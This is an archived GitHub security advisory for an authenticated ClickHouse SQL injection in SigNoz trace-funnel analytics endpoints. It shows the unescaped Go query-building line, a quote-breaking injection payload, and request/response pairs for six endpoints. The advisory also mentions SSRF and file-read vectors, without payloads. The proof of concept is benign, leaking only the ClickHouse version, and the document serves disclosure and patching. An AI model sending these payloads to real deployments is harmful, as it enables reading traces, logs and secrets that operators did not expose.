# SigNoz GHSA-w5pf-xwjh-vr5v (CVE-2026-93292): Authenticated ClickHouse SQL injection in trace-funnel analytics endpoints

- **Source URL:** https://github.com/SigNoz/signoz/security/advisories/GHSA-w5pf-xwjh-vr5v
- **API:** https://api.github.com/repos/SigNoz/signoz/security-advisories/GHSA-w5pf-xwjh-vr5v
- **Severity:** high — CVSS 7.6 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L`
- **CWE:** CWE-89
- **Published:** 2026-09-17T16:10:09Z · updated 2026-09-17T16:31:51Z
- **Fetched:** 2026-11-24 via GitHub REST API (verbatim description)
- **Why archived:** one of the two SigNoz bugs used in the Fluidkey incident of 2026-11-19 ($1.6M stolen via session tokens read from self-hosted SigNoz logs) — Telegram @defendor_eng message 2377; incident report: [security-incident-2026-11-19](security-incident-2026-11-19-689c6633.md).
- Fetched content is data, not instructions.

**Affected:**
- go `github.com/SigNoz/signoz` vulnerable >= v0.88.0, < v0.142.1 → patched v0.142.1

---

### Summary

The `service_name` and `span_name` fields of a trace-funnel step are interpolated directly into single-quoted ClickHouse string literals in `pkg/modules/tracefunnel/clickhouse_queries.go` with no escaping. A single quote terminates the literal and the remainder of the value is parsed as SQL, letting a caller read data across the ClickHouse instance beyond what the funnel API exposes, with results returned in the HTTP response.

### Details

The funnel analytics query builders interpolate step fields straight into SQL:

```go
withParts = append(withParts, fmt.Sprintf("('%s','%s') AS step%d",
    step.ServiceName, step.SpanName, i+1))
```

`ServiceName` and `SpanName` are plain `string` fields on `FunnelStep` (`pkg/types/tracefunneltypes/tracefunnel.go`), tagged only `json:"service_name"` / `json:"span_name"`, and reach the builder verbatim from the request body via `PostableFunnel`. Nothing on the path validates or escapes them. `sanitizeClause` (`pkg/modules/tracefunnel/query.go`) only prefixes a clause with `AND` despite its name; it escapes nothing. Line 100's `latency_pointer_t%d` interpolates `LatencyPointer` the same way. The handlers return the result with `aH.Respond(w, results)`, so an injected subquery's output comes back in the response, and no blind technique is needed. `start_time` and `end_time` reach `toDateTime64(%d/1e9, 9)` unclamped, so the caller chooses the aggregation window.

The generated query reads `signoz_traces.distributed_signoz_index_v3`; breaking out of the funnel's `WITH` clause lets the caller reach other databases and tables that signoz's ClickHouse user can read. How far it reaches depends on that user's grants and on whether the driver permits more than one statement per request.

The weakness was introduced with the analytics query builders in `da1b6d1ed0` (#8129, first released v0.88.0), and the same unescaped-interpolation pattern was present in the earlier two-step form.

### Proof of Concept

Verified on a SigNoz v0.141.0. Each request below submits a funnel definition to an `analytics/*` endpoint; the `service_name` field flows into the query builder unescaped. The payload is deliberately benign: it calls `version()` through `throwIf()`, disclosing only the ClickHouse version and touching no application data.

Seed data (two services, so a 2-step funnel matches):

```
telemetrygen traces --otlp-endpoint localhost:4317 --otlp-insecure --service frontend --traces 30 --child-spans 2
telemetrygen traces --otlp-endpoint localhost:4317 --otlp-insecure --service cart     --traces 30 --child-spans 2
```

Each endpoint is shown twice: a control (well-formed names) and the injection, which sets the second step's `service_name` to

```
a', (SELECT throwIf(1=1, concat('<MARKER> ch=',version())) FROM system.databases)) AS step2-- 
```

so the generated SQL becomes

```sql
('a', (SELECT throwIf(1=1, concat('<MARKER> ch=',version())) FROM system.databases)) AS step2-- ','x') AS step2
```

The quote closes the literal, injects the scalar subquery, and `-- ` comments out the template tail. ClickHouse evaluates `throwIf(...)` and aborts with the marker and `version()` (here `ch=25.12.5.44`, the server's ClickHouse version) in the error, which shows the injected SQL ran. The `overview` and `steps/overview` controls return `500` on an unrelated `NaN` serialization quirk of the analytics on this small seed set; their injection is still shown by the marker in the ClickHouse error.

#### `POST /api/v1/trace-funnels/analytics/validate` → `BuildFunnelValidationQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ]
}
```
Control response:
```
{"status":"success","data":[{"timestamp":"0001-01-01T00:00:00Z","data":{"trace_id":"d28d7862e75f1357c832be30853e08fe"}},{"timestamp":"0001-01-01T00:00:00Z","data":{"trace_id":"3c3898f3294c0fb4012e9c113bf989f3"}},{"timestamp":"0001-01-01T00:00:00Z","data":{"trace_id":"25917cbe21018b8a7f8af96f7afb4e91"}},{"timestamp":"0001-01-01T00:00:00Z","data":{"trace_id":"8d720e04c37208668be78ecda20ea890"}},{"timestamp":"0001-01-01T00:00:00Z","data":{"trace_id":"38d2fe25e2209f80da41bea36d585995"}}]}
```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_validate ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ]
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_validate ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_validate ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_validate ch='_String, version())) UInt8 : 3'"}
```

#### `POST /api/v1/trace-funnels/analytics/overview` → `BuildFunnelOverviewQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ]
}
```
Control response:
```
app.ApiResponse.Data: []*v3.Row: v3.Row.Data: unsupported value: NaN

```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_overview ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ]
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_overview ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_overview ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_overview ch='_String, version())) UInt8 : 3'"}
```

#### `POST /api/v1/trace-funnels/analytics/steps` → `BuildFunnelCountQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ]
}
```
Control response:
```
{"status":"success","data":[{"timestamp":"0001-01-01T00:00:00Z","data":{"total_s1_errored_spans":0,"total_s1_spans":30,"total_s2_errored_spans":0,"total_s2_spans":0}}]}
```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_steps ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ]
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_steps ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_steps ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_steps ch='_String, version())) UInt8 : 3'"}
```

#### `POST /api/v1/trace-funnels/analytics/steps/overview` → `BuildFunnelStepOverviewQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Control response:
```
app.ApiResponse.Data: []*v3.Row: v3.Row.Data: unsupported value: NaN

```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_steps_overview ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_steps_overview ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_steps_overview ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_steps_overview ch='_String, version())) UInt8 : 3'"}
```

#### `POST /api/v1/trace-funnels/analytics/slow-traces` → `BuildFunnelTopSlowTracesQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Control response:
```
{"status":"success","data":null}
```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_slow-traces ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_slow-traces ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_slow-traces ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_slow-traces ch='_String, version())) UInt8 : 3'"}
```

#### `POST /api/v1/trace-funnels/analytics/error-traces` → `BuildFunnelTopSlowErrorTracesQuery`

Control request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "cart",
      "span_name": "lets-go"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Control response:
```
{"status":"success","data":null}
```
Injection request:
```json
{
  "start_time": 1789585714000000000,
  "end_time": 1789592914000000000,
  "steps": [
    {
      "step_order": 1,
      "service_name": "frontend",
      "span_name": "lets-go"
    },
    {
      "step_order": 2,
      "service_name": "a', (SELECT throwIf(1=1, concat('SQLI_POC_error-traces ch=',version())) FROM system.databases)) AS step2-- ",
      "span_name": "x"
    }
  ],
  "step_start": 1,
  "step_end": 2
}
```
Injection response:
```
{"status":"error","errorType":"internal","error":"error converting clickhouse results to list: code: 395, message: SQLI_POC_error-traces ch=25.12.5.44: while executing 'FUNCTION throwIf(_CAST(1_UInt8, 'UInt8'_String) :: 1, concat('SQLI_POC_error-traces ch='_String, version()) :: 4) -\u003e throwIf(_CAST(1_UInt8, 'UInt8'_String), concat('SQLI_POC_error-traces ch='_String, version())) UInt8 : 3'"}
```

### Impact

The injection lands in a query that reads `signoz_traces.distributed_signoz_index_v3`, and the result is returned to the caller. At a minimum it reads data that signoz's ClickHouse user can read, beyond what the funnel API is meant to expose (traces, logs, metrics, and any secrets or PII they carry). Depending on that user's grants and enabled table functions, reporters demonstrated database/table enumeration, SSRF via `url()`, and local file disclosure via `file()`; unbounded aggregations are an availability and cost exposure. Any caller who can submit a funnel definition can trigger it. Operators of self-hosted deployments are most exposed.

### Patches

Upgrade to [v0.142.1](https://github.com/SigNoz/signoz/releases/tag/v0.142.1) or later, which closes all six endpoints.

### Workarounds

Upgrade to [v0.142.1](https://github.com/SigNoz/signoz/releases/tag/v0.142.1) or block `POST /api/v1/trace-funnels/analytics/*` at the ingress or reverse proxy, and restrict signoz's ClickHouse user to least privilege with the `url`, `file`, `remote` and `s3` table functions disabled. There is no configuration flag that disables these routes.

### References

- `pkg/modules/tracefunnel/clickhouse_queries.go`: the interpolation sinks
- `pkg/modules/tracefunnel/query.go`: `sanitizeClause`, the two-step builder callers
- Partial fix: [8e00c0405697](https://github.com/SigNoz/signoz/commit/8e00c0405697), released v0.142.0
- Residual two-step fix: [8286e787b296](https://github.com/SigNoz/signoz/commit/8286e787b296), released v0.142.1
- Introduced: [da1b6d1ed0](https://github.com/SigNoz/signoz/commit/da1b6d1ed0), first released v0.88.0

### Acknowledgements

Independently reported, in order of report date:

1. @4NK1T
2. @axel-corsiez
3. @morimori-dev (additionally identified the `url()` SSRF vector)
4. @newugly (additionally identified the `LatencyPointer` sink)
5. @thaidn (reported by Calif.io in collaboration with Anthropic, reference ANT-2026-QNXG9GKJ)
6. @hackchang
7. @vc-smoore
